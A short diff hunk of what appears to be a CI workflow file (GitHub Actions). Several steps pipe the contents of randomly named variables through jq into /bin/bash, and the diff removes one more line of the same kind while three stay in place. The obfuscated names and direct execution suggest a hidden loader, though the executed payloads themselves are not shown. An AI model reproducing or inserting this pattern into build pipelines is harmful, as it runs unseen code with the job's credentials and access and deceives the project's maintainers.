@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$uoep08" | jq -r .ey50 | /bin/bash
           printf '%s' "$u0457" | jq -r .shqyw6499 | /bin/bash
           echo $zenti861 | jq -r .mwuw78636 | /bin/bash
-          printf '%s' "$k4139" | jq -r .evpv3384 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
